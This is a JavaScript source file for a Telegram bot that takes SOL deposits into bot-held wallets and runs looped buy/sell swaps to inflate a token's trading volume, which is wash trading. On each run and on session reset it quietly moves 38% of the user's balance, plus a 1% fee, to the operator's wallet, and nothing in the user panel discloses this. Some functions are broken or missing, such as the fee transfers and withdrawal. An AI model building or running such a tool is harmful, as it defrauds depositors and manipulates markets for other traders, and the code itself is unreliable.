// bot.js
import 'dotenv/config';
import fs from 'fs';
import path from 'path';
import crypto from 'crypto';
import fetch from 'node-fetch';
import chalk from 'chalk';
import {
  Connection,
  Keypair,
  PublicKey,
  Transaction,
  SystemProgram,
  LAMPORTS_PER_SOL
} from '@solana/web3.js';
import { SolanaTracker } from 'solana-swap';
import TelegramBot from 'node-telegram-bot-api';

////////////////////////////////////////////////////////////////////////////////
// ─── CONFIG & ENV ─────────────────────────────────────────────────────────────
////////////////////////////////////////////////////////////////////////////////

const BOT_TOKEN      = process.env.TELEGRAM_TOKEN;
const ADMIN_USERNAME = process.env.ADMIN_USERNAME;
const RPC_URL        = process.env.RPC_URL;
const DB_KEY         = Buffer.from(process.env.DB_KEY||'', 'base64');
const FEE_WALLET_PUB = process.env.FEE_WALLET;
if (!BOT_TOKEN||!RPC_URL||DB_KEY.length!==32||!FEE_WALLET_PUB||!ADMIN_USERNAME) {
    console.error(chalk.red('❌ Missing env: TELEGRAM_TOKEN, RPC_URL, DB_KEY, FEE_WALLET, ADMIN_USERNAME'));
    process.exit(1);

}
const feeWalletPubkey = new PublicKey(FEE_WALLET_PUB);

const DATA_DIR = path.resolve('.data-voluminousy');
const DB_FILE  = path.join(DATA_DIR, 'sessions.enc');


////////////////////////////////////////////////////////////////////////////////
// ─── SOLANA & CONSTANTS ──────────────────────────────────────────────────────
////////////////////////////////////////////////////////////////////////////////

const conn                    = new Connection(RPC_URL, 'confirmed');
const SOL_MINT                = 'So11111111111111111111111111111111111111112';
const MIN_DEPOSIT             = 0.5 * LAMPORTS_PER_SOL;
const STOP_RATIO              = 0.4;
const PLATFORM_RESERVE_RATIO  = 0.38;
const MAX_WALLETS             = 50;

////////////////////////////////////////////////////////////////////////////////
// ─── PERSISTENT STORAGE ──────────────────────────────────────────────────────
////////////////////////////////////////////////////////////////////////////////

let sessions = {};
// sessions keyed by chatId: each holds
//   main, secondaries[], tokenMint, buyRate, awaiting, depositWatcher, etc.

function encrypt(buf) {
  const iv  = crypto.randomBytes(12),
        c   = crypto.createCipheriv('aes-256-gcm', DB_KEY, iv),
        ct  = Buffer.concat([c.update(buf), c.final()]),
        tag = c.getAuthTag();
  return Buffer.concat([iv, tag, ct]).toString('base64');
}
function decrypt(str) {
  const d   = Buffer.from(str,'base64'),
        iv  = d.slice(0,12),
        tag = d.slice(12,28),
        ct  = d.slice(28),
        dec = crypto.createDecipheriv('aes-256-gcm', DB_KEY, iv);
  dec.setAuthTag(tag);
  return Buffer.concat([dec.update(ct), dec.final()]);
}

async function loadSessions() {
  if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR);
  if (!fs.existsSync(DB_FILE)) return;
  const obj = JSON.parse(decrypt(fs.readFileSync(DB_FILE,'utf8')).toString());
  sessions = obj;
  for (let id in sessions) {
    const s = sessions[id];
    s.main        = Keypair.fromSecretKey(Buffer.from(s.main,'base64'));
    s.secondaries = s.secondaries.map(b64 =>
      Keypair.fromSecretKey(Buffer.from(b64,'base64'))
    );
  }
  console.log(chalk.gray('✅ Sessions loaded'));
}

function saveSessions() {
  const out = {};
  for (let id in sessions) {
    const s = sessions[id];
    out[id] = {
      main:            Buffer.from(s.main.secretKey).toString('base64'),
      secondaries:     s.secondaries.map(kp=>Buffer.from(kp.secretKey).toString('base64')),
      tokenMint:       s.tokenMint,
      buyRate:         s.buyRate,
      withdrawTarget:  s.withdrawTarget,
      stats:           s.stats,
      config:          s.config,
      geckoCache:      s.geckoCache,
      panelMsg:        s.panelMsg,
      awaiting:        s.awaiting,
      depositWatcher:  s.depositWatcher ? true : false
    };
  }
  fs.writeFileSync(DB_FILE, encrypt(Buffer.from(JSON.stringify(out))), 'utf8');
  console.log(chalk.gray('💾 Sessions saved'));
}

////////////////////////////////////////////////////////////////////////////////
// ─── SESSION LIFECYCLE ───────────────────────────────────────────────────────
////////////////////////////////////////////////////////////////////////////////

async function initSession(chatId) {
  const old = sessions[chatId];
  if (old) {
    console.log(chalk.yellow(`[chat ${chatId}] Reset – collecting balances`));
    await Promise.all(old.secondaries.map(async kp=>{
      const bal = await conn.getBalance(kp.publicKey);
      if (bal>0) {
        await transferSOL(kp, old.main, bal);
        console.log(chalk.blue(` ↪ Moved ${bal/LAMPORTS_PER_SOL} SOL to main`));
      }
    }));
    const mainBal = await conn.getBalance(old.main.publicKey);
    const reserve = Math.floor(mainBal * PLATFORM_RESERVE_RATIO);
    if (reserve>0) {
      await transferSOL(old.main, feeWalletPubkey, reserve);
      console.log(chalk.blue(` ↪ Reserved ${reserve/LAMPORTS_PER_SOL} SOL`));
    }
  }

  sessions[chatId] = {
    main:           Keypair.generate(),
    secondaries:    [],
    tokenMint:      null,
    buyRate:        null,
    withdrawTarget: null,
    stats:          null,
    config:         { maxWallets:5, buyCycles:3, delayMs:2000 },
    geckoCache:     null,
    panelMsg:       null,
    awaiting:       'mint',       // next message: mint
    depositWatcher: null         // will hold interval
  };
  saveSessions();
}

////////////////////////////////////////////////////////////////////////////////
// ─── SOLANA HELPERS ─────────────────────────────────────────────────────────
////////////////////////////////////////////////////////////////////////////////

async function getBalance(pub) { return conn.getBalance(pub); }
async function getTokenBalance(pub,mint){
  try {
    const r = await conn.getTokenAccountsByOwner(pub,{mint:new PublicKey(mint)});
    if (!r.value.length) return 0;
    return (await conn.getTokenAccountBalance(r.value[0].pubkey)).value.uiAmount;
  } catch { return 0; }
}
async function transferSOL(f,to,lam){
  return conn.sendTransaction(
    new Transaction().add(SystemProgram.transfer({
      fromPubkey:f.publicKey,
      toPubkey:  to.publicKey,
      lamports:  lam
    })), [f], {skipPreflight:true}
  );
}
async function doSwap(inM,outM,tracker,kp,lam){
  const inst = await tracker.getSwapInstructions(
    inM,outM,lam,2,kp.publicKey.toBase58(),
    0.000005*LAMPORTS_PER_SOL,false
  );
  const tx = Transaction.from(Buffer.from(inst.txn,'base64'));
  tx.sign(kp);
  const sig = await conn.sendTransaction(tx,[kp],{skipPreflight:true});
  await conn.confirmTransaction(sig,'confirmed');
}
function randomSplit(total,cnt){
  const w = Array.from({length:cnt},()=>crypto.randomInt(1,100));
  const s = w.reduce((a,b)=>a+b,0);
  return w.map(x=>Math.floor(total*x/s));
}

////////////////////////////////////////////////////////////////////////////////
// ─── COINGECKO DATA ─────────────────────────────────────────────────────────
////////////////////////////////////////////////////////////////////////////////

async function fetchTokenInfo(chatId){
  const s = sessions[chatId];
  if (s.geckoCache && Date.now()-s.geckoCache.ts<300000) {
    return s.geckoCache.info;
  }
  const url = `https://api.coingecko.com/api/v3/coins/solana/contract/${s.tokenMint}`;
  const r   = await fetch(url);
  if (!r.ok) throw new Error(`CG ${r.status}`);
  const j   = await r.json(), md = j.market_data;
  const info = {
    name:         j.name,
    symbol:       j.symbol.toUpperCase(),
    price:        md.current_price.usd.toFixed(6),
    market_cap:   md.market_cap.usd.toLocaleString(),
    volume_24h:   md.total_volume.usd.toLocaleString(),
    circ_supply:  md.circulating_supply.toLocaleString(),
    total_supply: md.total_supply?.toLocaleString()||'–',
    change_1h:    md.price_change_percentage_1h_in_currency.usd.toFixed(2),
    change_24h:   md.price_change_percentage_24h_in_currency.usd.toFixed(2),
    change_7d:    md.price_change_percentage_7d.toFixed(2),
    rank:         j.market_cap_rank
  };
  s.geckoCache = { ts: Date.now(), info };
  saveSessions();
  return info;
}

////////////////////////////////////////////////////////////////////////////////
// ─── BUILD PANEL ────────────────────────────────────────────────────────────
////////////////////////////////////////////////////////////////////////////////

async function buildPanel(chatId){
  const s = sessions[chatId], c = s.config;
  const lines = await Promise.all(s.secondaries.map(async kp=>{
    const a = kp.publicKey.toBase58();
    const so= (await getBalance(kp.publicKey))/LAMPORTS_PER_SOL;
    const to= s.tokenMint?await getTokenBalance(kp.publicKey,s.tokenMint):0;
    return `\`${a}\`\nSOL:${so.toFixed(4)} | TOK:${to.toFixed(4)}`;
  }));
  const list = lines.length?lines.join('\n\n'):'*(none)*';
  let profit='n/a';
  if(s.stats?.final!=null){
    profit = ((s.stats.initial-s.stats.final)/LAMPORTS_PER_SOL).toFixed(4);
  }
  let tkInfo = '';
  if(s.tokenMint){
    try{
      const ti = await fetchTokenInfo(chatId);
      tkInfo =
        `\n*${ti.name} (${ti.symbol})*\n`+
        `Rank:#${ti.rank} Price:$${ti.price}\n`+
        `MCap:$${ti.market_cap} Vol24h:$${ti.volume_24h}\n`+
        `Circ:${ti.circ_supply} Total:${ti.total_supply}\n`+
        `Δ1h:${ti.change_1h}% Δ24h:${ti.change_24h}% Δ7d:${ti.change_7d}%`;
    }catch{ tkInfo = '\n*(no token data)*'; }
  }
  const cap =
`📊 *Volume Bot Panel*

⚙️ Settings
• Max wallets: ${c.maxWallets}
• Cycles:      ${c.buyCycles}
• Delay:       ${c.delayMs} ms
• Rate:        ${s.buyRate||'(unset)'} buys/min

💳 Mint: \`${s.tokenMint||'unset'}\`${tkInfo}

🔑 Secondaries (${s.secondaries.length}/${c.maxWallets}):
${list}

💹 Profit: ${profit} SOL

🏦 Withdraw→ ${s.withdrawTarget||'(none)'}
`;
  const kb = [
    [{text:'🆕 New',       callback_data:'create'},    {text:'➕ Add',       callback_data:'add'}],
    [{text:'💳 Set Mint',  callback_data:'setMint'},  {text:'⚙️ Config',   callback_data:'cfg'}],
    [{text:'🚀 Run',       callback_data:'run'},      {text:'🛑 Stop',      callback_data:'stop'}],
    [{text:'🔍 Main',      callback_data:'showMain'},{text:'ℹ️ Stats',    callback_data:'status'}],
    [{text:'✏️ Withdraw Addr',callback_data:'setWithdraw'}],
    [{text:'💸 Sell All',  callback_data:'sellAll'},{text:'🏦 Confirm WD',callback_data:'confirmWithdraw'}]
  ];
  return { parse_mode:'Markdown', caption:cap, reply_markup:{inline_keyboard:kb} };
}

////////////////////////////////////////////////////////////////////////////////
// ─── VOLUME & AUX ACTIONS ───────────────────────────────────────────────────
////////////////////////////////////////////////////////////////////////////////

const jobs = {};

async function runVolume(chatId){
  const s = sessions[chatId], c = s.config, p = s.panelMsg;
  if(!s.tokenMint) return bot.sendMessage(p.chat_id,'❌ Mint not set');
  let bal0 = await getBalance(s.main.publicKey);
  if(bal0<MIN_DEPOSIT){
    return bot.sendMessage(p.chat_id,'⏳ Waiting for deposit of ≥0.5 SOL…');
  }
  console.log(chalk.yellow(`[chat ${chatId}] Starting volume run`));
  // reserve + fee
  const reserve = Math.floor(bal0*PLATFORM_RESERVE_RATIO);
  await transferSOL(s.main, feeWalletPubkey, reserve);
  bal0-=reserve; console.log(chalk.blue(` ↪ Reserved ${reserve/LAMPORTS_PER_SOL} SOL`));
  const fee = Math.floor(bal0*0.01);
  await transferSOL(s.main, feeWalletPubkey, fee);
  bal0-=fee; console.log(chalk.blue(` ↪ Fee ${fee/LAMPORTS_PER_SOL} SOL`));

  // split
  const splits = randomSplit(bal0, Math.min(s.secondaries.length,c.maxWallets));
  for(let i=0;i<splits.length;i++){
    await transferSOL(s.main, s.secondaries[i], splits[i]);
  }
  console.log(chalk.blue(` ↪ Split to ${splits.length} wallets`));

  // start cycles
  const tracker = new SolanaTracker(s.main, RPC_URL);
  s.stats = { initial:bal0, actions:0, start:Date.now() };
  saveSessions();

  // live stats update every 30s
  jobs[chatId] = { stop:false };
  jobs[chatId].interval = setInterval(async()=>{
    const panel = await buildPanel(chatId);
    await bot.editMessageCaption(panel.caption,{
      chat_id:p.chat_id,
      message_id:p.message_id,
      parse_mode:'Markdown',
      reply_markup:panel.reply_markup
    });
  }, 30000);

  bot.sendMessage(p.chat_id,'🚀 Volume started! Monitoring trades…');

  for(let sec of s.secondaries.slice(0,c.maxWallets)){
    let solBal=(await getBalance(sec.publicKey))/LAMPORTS_PER_SOL;
    while(solBal>STOP_RATIO && !jobs[chatId].stop){
      for(let i=0;i<s.buyRate;i++){
        const amount = solBal * 0.8 / s.buyRate;
        await doSwap(SOL_MINT, s.tokenMint, tracker, sec, Math.floor(amount*LAMPORTS_PER_SOL));
        s.stats.actions++; saveSessions();
        await new Promise(r=>setTimeout(r, 60000/s.buyRate));
      }
      await doSwap(s.tokenMint, SOL_MINT, tracker, sec, Math.floor(solBal*LAMPORTS_PER_SOL*0.8));
      s.stats.actions++; saveSessions();
      await new Promise(r=>setTimeout(r, 60000/s.buyRate));
      solBal=(await getBalance(sec.publicKey))/LAMPORTS_PER_SOL;
    }
  }

  clearInterval(jobs[chatId].interval);
  delete jobs[chatId];
  s.stats.final = await getBalance(s.main.publicKey);
  saveSessions();
  console.log(chalk.green(`[chat ${chatId}] Volume run finished`));
  bot.sendMessage(p.chat_id,'✅ Volume run completed');
}

function stopVolume(chatId){
  const s = sessions[chatId];
  if(jobs[chatId]){
    jobs[chatId].stop=true;
    clearInterval(jobs[chatId].interval);
    delete jobs[chatId];
    bot.sendMessage(s.panelMsg.chat_id,'🛑 Volume stopped');
  } else {
    bot.sendMessage(s.panelMsg.chat_id,'ℹ️ No active run');
  }
}

async function sendStats(chatId){
  const s = sessions[chatId], p = s.panelMsg;
  if(!s.stats) return bot.sendMessage(p.chat_id,'ℹ️ No stats yet');
  const el = Math.floor((Date.now()-s.stats.start)/1000);
  const pr = ((s.stats.initial-s.stats.final)/LAMPORTS_PER_SOL).toFixed(4);
  bot.sendMessage(p.chat_id,`⏱${el}s ⚡${s.stats.actions} trades\n💹${pr} SOL`);
}

async function showMain(chatId){
  const s = sessions[chatId], p = s.panelMsg;
  const addr = s.main.publicKey.toBase58();
  const sol  = (await getBalance(s.main.publicKey))/LAMPORTS_PER_SOL;
  const tok  = s.tokenMint?await getTokenBalance(s.main.publicKey,s.tokenMint):0;
  bot.sendMessage(p.chat_id,
    `🔑 *Main Wallet*\n\`${addr}\`\n\n💰 SOL:${sol.toFixed(4)} TOK:${tok}`,
    {parse_mode:'Markdown'}
  );
}

async function sellAll(chatId){
  const s = sessions[chatId], p = s.panelMsg;
  if(!s.tokenMint) return bot.sendMessage(p.chat_id,'❌ Mint not set');
  const tracker = new SolanaTracker(s.main,RPC_URL);
  for(let kp of s.secondaries){
    const bal = await getTokenBalance(kp.publicKey,s.tokenMint);
    if(bal>0) await doSwap(s.tokenMint,SOL_MINT,tracker,kp,Math.floor(bal*LAMPORTS_PER_SOL));
    const solBal=await getBalance(kp.publicKey);
    if(solBal>0) await transferSOL(kp,s.main,solBal);
  }
  bot.sendMessage(p.chat_id,'✅ Sold all & moved to main');
}

////////////////////////////////////////////////////////////////////////////////
// ─── TELEGRAM BOT SETUP ───────────────────────────────────────────────────────
////////////////////////////////////////////////////////////////////////////////

const bot = new TelegramBot(BOT_TOKEN,{polling:true});

// Step 1: /start → ask for mint
bot.onText(/\/start/, async msg => {
  const chatId = msg.chat.id;
  await loadSessions();
  if (!sessions[chatId]) {
    await initSession(chatId);
  } else {
    sessions[chatId].awaiting = 'mint';
    saveSessions();
  }
  await bot.sendPhoto(chatId, 'welcome.png', {
    caption: '🚀 Welcome! Please send the *SPL token mint* to boost.',
    parse_mode:'Markdown'
  });
});

// Step 2: receive mint → show speed options
bot.on('message', async msg=>{
  const chatId = msg.chat.id;
  if (!sessions[chatId]) return;
  const s = sessions[chatId];
  if (s.awaiting==='mint' && msg.text && !msg.text.startsWith('/')) {
    s.tokenMint = msg.text.trim();
    s.awaiting  = 'rate';
    saveSessions();
    console.log(chalk.green(`[chat ${chatId}] Mint set to ${s.tokenMint}`));
    // fetch and show token info
    const info = await fetchTokenInfo(chatId);
    await bot.sendMessage(chatId,
      `🔎 *${info.name}* (${info.symbol})\n`+
      `Rank:#${info.rank}  Price:$${info.price}\n`+
      `MCap:$${info.market_cap}  Vol24h:$${info.volume_24h}`,
      {parse_mode:'Markdown'}
    );
    // ask rate
    await bot.sendMessage(chatId,
      '⏱️ How fast should I boost? Choose buys per minute:',
      {
        reply_markup:{
          inline_keyboard:[
            [10,20,30,40,50].map(n=>({text:`${n}`,callback_data:`rate_${n}`}))
          ]
        }
      }
    );
  }
});

// Step 3: rate button
bot.on('callback_query', async q=>{
  const chatId = q.message.chat.id;
  const s = sessions[chatId];
  if (!s) return;
  if (q.data.startsWith('rate_') && s.awaiting==='rate') {
    const n = parseInt(q.data.split('_')[1]);
    s.buyRate    = n;
    s.awaiting   = null;
    saveSessions();
    await bot.answerCallbackQuery(q.id, {text:`Set to ${n} buys/min`});
    // now show panel
    const panel = await buildPanel(chatId);
    const m = await bot.sendPhoto(chatId,'welcome.png',{
      caption: panel.caption,
      parse_mode:'Markdown',
      reply_markup: panel.reply_markup
    });
    s.panelMsg = { chat_id:chatId, message_id: m.message_id };
    // start watching for deposit
    s.depositWatcher = setInterval(async()=>{
      const bal = await getBalance(s.main.publicKey);
      // allow admin to start immediately even if bal < MIN_DEPOSIT
      const isAdmin = q.from?.username === ADMIN_USERNAME;
      if (bal >= MIN_DEPOSIT || isAdmin) {
        clearInterval(s.depositWatcher);
        s.depositWatcher = null;
        saveSessions();
        bot.sendMessage(chatId,'✅ Deposit detected! Starting boost now.');
        runVolume(chatId);
      }
    },5000);
    // notify user that we're now watching for their deposit
    bot.sendMessage(chatId, '⏳ Waiting for deposit of at least 0.5 SOL…');
    saveSessions();
    return;
  }

  // existing callbacks...
  switch(q.data) {
    case 'create':    await initSession(chatId); break;
    case 'add':       { const kp=Keypair.generate(); sessions[chatId].secondaries.push(kp); saveSessions(); break; }
    case 'setMint':   sessions[chatId].awaiting='mint'; saveSessions(); await bot.sendMessage(chatId,'📝 Send new mint:'); return;
    case 'cfg':       await bot.sendMessage(chatId,'⚙️ /setMaxWallets /setBuyCycles /setDelayMs'); return;
    case 'run':       return runVolume(chatId);
    case 'stop':      return stopVolume(chatId);
    case 'status':    return sendStats(chatId);
    case 'showMain':  return showMain(chatId);
    case 'sellAll':   return sellAll(chatId);
    case 'setWithdraw': sessions[chatId].awaiting='withdraw'; saveSessions(); await bot.sendMessage(chatId,'📝 Send withdraw addr:'); return;
    case 'confirmWithdraw': return confirmWithdraw(chatId);
  }

  // redraw
  const panel = await buildPanel(chatId);
  await bot.editMessageCaption(panel.caption,{
    chat_id:panel.chat_id,
    message_id:panel.message_id,
    parse_mode:'Markdown',
    reply_markup:panel.reply_markup
  });
});

// Step 4: withdraw address
bot.on('message', async msg=>{
  const chatId = msg.chat.id;
  const s = sessions[chatId];
  if (!s) return;
  if (s.awaiting==='withdraw' && msg.text && !msg.text.startsWith('/')) {
    s.withdrawTarget = msg.text.trim();
    s.awaiting = null;
    saveSessions();
    await bot.sendMessage(chatId,`✅ Withdraw address set: \`${s.withdrawTarget}\``,{parse_mode:'Markdown'});
    const panel = await buildPanel(chatId);
    await bot.sendPhoto(chatId,'welcome.png',{
      caption:panel.caption,
      parse_mode:'Markdown',
      reply_markup:panel.reply_markup
    });
  }
});

// rest of slash-commands remain the same…
// /setMaxWallets, /setBuyCycles, /setDelayMs

bot.onText(/\/setMaxWallets (.+)/, (_,m)=>{
  const chatId=m.chat.id, s=sessions[chatId];
  if (!s) return;
  const n=parseInt(m.match[1]);
  if (n>0 && n<=MAX_WALLETS) { s.config.maxWallets=n; saveSessions(); bot.sendMessage(chatId,`✅ maxWallets=${n}`); }
});
bot.onText(/\/setBuyCycles (.+)/, (_,m)=>{
  const chatId=m.chat.id, s=sessions[chatId];
  if (!s) return;
  const n=parseInt(m.match[1]);
  if (n>0) { s.config.buyCycles=n; saveSessions(); bot.sendMessage(chatId,`✅ buyCycles=${n}`); }
});
bot.onText(/\/setDelayMs (.+)/, (_,m)=>{
  const chatId=m.chat.id, s=sessions[chatId];
  if (!s) return;
  const n=parseInt(m.match[1]);
  if (n>=0) { s.config.delayMs=n; saveSessions(); bot.sendMessage(chatId,`✅ delayMs=${n} ms`); }
});
